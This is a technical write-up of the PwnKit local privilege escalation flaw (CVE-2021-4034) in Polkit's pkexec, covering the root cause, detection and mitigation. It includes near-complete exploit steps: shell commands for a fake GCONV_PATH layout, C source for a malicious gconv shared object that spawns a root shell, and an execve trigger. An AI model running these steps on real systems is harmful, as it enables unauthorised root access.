# CVE-2021-4034 | PwnKit Deep Technical Analysis

> Local Privilege Escalation in Polkit's `pkexec`
>
> Research-focused breakdown of one of the most absurdly dangerous Linux privilege escalation vulnerabilities discovered in the last decade.

---

## [~] Overview

| Field | Value |
|---|---|
| CVE | CVE-2021-4034 |
| Name | PwnKit |
| Component | `pkexec` |
| Severity | Critical |
| Attack Type | Local Privilege Escalation |
| Impact | Low-privileged user → root |
| Public Disclosure | January 2022 |
| Vulnerable Since | May 2009 |

`PwnKit` is a memory corruption vulnerability inside Polkit's `pkexec` binary that allows any local user to escalate privileges to `root`.

The scary part was not the complexity.

The scary part was how simple the bug actually was.

A tiny argument validation mistake survived inside a SUID-root binary for almost **13 years** across nearly every major Linux distribution.

That means:
- Ubuntu
- Debian
- Fedora
- CentOS
- Arch
- RHEL
- SUSE

...all shipped a root escalation primitive basically for free.

---

# [~] What Is pkexec?

`pkexec` is part of the `polkit` framework.

Its job is to execute commands as another user according to system policy rules.

Normally:

```text
user → requests elevated action → polkit verifies permissions
```

But due to improper argument handling, attackers could manipulate memory in a way that allowed arbitrary environment variable injection into a privileged process.

And once you control environment loading inside a SUID-root process, things go downhill extremely fast.

---

# [~] Root Cause Analysis

## 1. Understanding argv and envp

In C, the `main()` function typically looks like this:

```c
int main(int argc, char **argv, char **envp)
```

### Components

| Variable | Meaning |
|---|---|
| `argc` | Number of arguments |
| `argv` | Array containing command-line arguments |
| `envp` | Array containing environment variables |

---

## 2. Important Memory Layout

Linux stores `argv` and `envp` contiguously in memory.

```text
+------------+------------+------------+------------+------------+
| argv[0]    | argv[1]    | NULL       | envp[0]    | envp[1]    |
+------------+------------+------------+------------+------------+
```

That contiguous placement becomes the entire reason this exploit exists.

Because when `argv[1]` does not exist...

...it overlaps with `envp[0]`.

Which means:
- out-of-bounds reads leak environment data
- out-of-bounds writes overwrite environment variables

And now the process memory layout starts looking like a crime scene.

---

# [~] The Vulnerable Logic

Simplified vulnerable pattern:

```c
for (n = 1; n < argc; n++) {
    // process args
}

path = argv[n];
```

Looks harmless.

It was not harmless.

---

## The Bug

When `pkexec` executes with no arguments:

```bash
pkexec
```

the following happens:

| Variable | Value |
|---|---|
| `argc` | 1 |
| `argv[0]` | "pkexec" |
| `argv[1]` | NULL |

The loop never runs because:

```c
1 < 1 == false
```

So `n` remains `1`.

Later:

```c
path = argv[1];
```

But `argv[1]` does not exist.

This creates an out-of-bounds access.

Because `argv` and `envp` are adjacent in memory:

```text
argv[1] → envp[0]
```

Now the binary accidentally reads attacker-controlled environment variables.

Peak secure coding moment.

---

# [~] Out-of-Bounds Read → Out-of-Bounds Write

This vulnerability becomes weaponizable because the invalid pointer is not only read.

It is later written back to.

## Result

| Primitive | Impact |
|---|---|
| OOB Read | Read environment variable memory |
| OOB Write | Overwrite environment variable pointers |

This allows attackers to reintroduce dangerous environment variables that SUID programs normally sanitize.

The most important one:

```text
GCONV_PATH
```

---

# [~] Why GCONV_PATH Matters

`GCONV_PATH` controls where the GNU `iconv` subsystem loads character conversion modules from.

Normally:
- SUID binaries strip it
- users cannot control it

But PwnKit lets attackers re-inject it into memory.

Which means attackers can force a root process to load a malicious shared object.

At that point the game is basically over.

---

# [~] Exploitation Chain

---

## Step 1 → Create Fake gconv Module Structure

```bash
mkdir -p "GCONV_PATH=."
touch "GCONV_PATH=./pwnkit"
chmod +x "GCONV_PATH=./pwnkit"
```

---

## Step 2 → Create Malicious gconv Configuration

```bash
mkdir -p pwnkit

echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules
```

This tells `iconv`:

> "load the module named `pwnkit` whenever charset conversion occurs."

---

## Step 3 → Build Malicious Shared Object

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);

    system("/bin/sh");

    exit(0);
}
```

Compile:

```bash
gcc pwnkit.c -o pwnkit.so -shared -fPIC
```

---

# [~] The Most Important Function

## `gconv_init()`

This function automatically executes when the gconv module loads.

Since:
- `pkexec` runs as SUID-root
- the shared library inherits those privileges

the payload executes as `root`.

No kernel exploit required.
No race condition required.
No heap feng shui wizardry required.

Just environment variable abuse and one cursed pointer mistake.

---

# [~] Final Exploit Trigger

The exploit executes `pkexec` using a crafted environment:

```c
char *env[] = {
    "pwnkit",
    "PATH=GCONV_PATH=.",
    "CHARSET=PWNKIT",
    "SHELL=pwnkit",
    NULL
};

execve("/usr/bin/pkexec", NULL, env);
```

---

# [~] Full Exploit Flow

```text
┌──────────────────────────────────────────────────────────────┐
│ Attacker executes pkexec with crafted environment            │
└──────────────────────────────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│ argc edge case triggers out-of-bounds read/write             │
└──────────────────────────────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│ envp[0] gets overwritten with attacker-controlled data       │
└──────────────────────────────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│ GCONV_PATH bypasses environment sanitization                 │
└──────────────────────────────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│ iconv loads malicious shared object                          │
└──────────────────────────────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│ gconv_init() executes as root                                │
└──────────────────────────────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│ Root shell spawned                                           │
└──────────────────────────────────────────────────────────────┘
```

---

# [~] Why PwnKit Was So Dangerous

## Extremely Reliable

Unlike many local privilege escalations:
- no kernel panic roulette
- no race timing
- no ASLR bypass complexity
- no heap corruption gymnastics

It worked consistently across:
- architectures
- distributions
- environments

That reliability made it terrifying for defenders.

---

# [~] Detection

## Check pkexec Version

```bash
pkexec --version
```

---

## Check Installed Polkit Package

### Debian / Ubuntu

```bash
dpkg -l policykit-1
```

### RHEL / Fedora

```bash
rpm -qa | grep polkit
```

### Arch Linux

```bash
pacman -Q polkit
```

---

## Detect Suspicious Artifacts

```bash
find /tmp -iname "*GCONV*"
find /tmp -iname "*pwnkit*"
```

---

# [~] Mitigation

## Temporary Fix

Remove the SUID bit:

```bash
sudo chmod 0755 /usr/bin/pkexec
```

This completely kills the escalation vector.

---

## Permanent Fix

Update Polkit.

### Debian / Ubuntu

```bash
sudo apt update
sudo apt upgrade policykit-1
```

### Fedora / RHEL

```bash
sudo dnf update polkit
```

### Arch Linux

```bash
sudo pacman -Syu polkit
```

---

# [~] The Official Patch

The upstream fix was hilariously small compared to the impact.

Patched logic:

```c
if (argc < 1) {
    return 127;
}
```

One missing validation check.

Thirteen years.

Root compromise.

Modern computing is held together with caffeine and undefined behavior.

---

# [~] Key Takeaways

| Topic | Summary |
|---|---|
| Root Cause | Improper argument validation |
| Bug Type | Out-of-bounds read/write |
| Privilege Level | Local user → root |
| Exploit Complexity | Low |
| Reliability | Extremely high |
| Exploit Technique | Environment variable injection |
| Main Abuse Vector | `GCONV_PATH` |

---

# [~] Final Thoughts

PwnKit became legendary because it exposed a brutal reality of offensive security:

Sometimes the most devastating vulnerabilities are not advanced kernel chains or impossible memory corruption puzzles.

Sometimes it's just:
- one unchecked edge case
- one invalid pointer
- one assumption nobody revisited for over a decade

And suddenly every low-privileged user on the box is root.

That is why secure coding matters.
That is why argument validation matters.
And that is why SUID binaries should always be treated like loaded weapons.

---

# [~] References

- Qualys Security Advisory
- MITRE CVE Database
- NVD Database
- Polkit Source Code
- Public Exploit Research

---

Source material adapted and expanded from uploaded research notes. :contentReference[oaicite:0]{index=0}
